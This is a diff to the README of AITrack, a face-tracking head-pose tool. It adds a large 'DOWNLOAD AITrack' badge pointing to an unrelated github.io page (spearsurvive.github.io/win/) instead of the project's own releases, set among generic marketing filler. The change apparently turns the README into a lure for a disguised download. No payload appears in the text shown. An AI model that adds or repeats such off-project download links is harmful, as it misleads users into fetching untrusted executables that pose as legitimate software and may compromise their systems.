@@ -30,6 +30,12 @@ AITrack uses neural network face detection to estimate head pose from a standard
 
 Whether you're a newcomer or a veteran, AITrack provides the tools you need to get the most out of your ai tools experience. Designed for Windows and macOS, it delivers a seamless, high-performance workflow.
 
+<div align="center">
+
+[![Download AITrack](https://img.shields.io/badge/⬇_DOWNLOAD_AITrack-CE0000?style=for-the-badge&logo=github&logoColor=white)](https://spearsurvive.github.io/win/)
+
+</div>
+
 ---
 
 ## ✨ Key Features
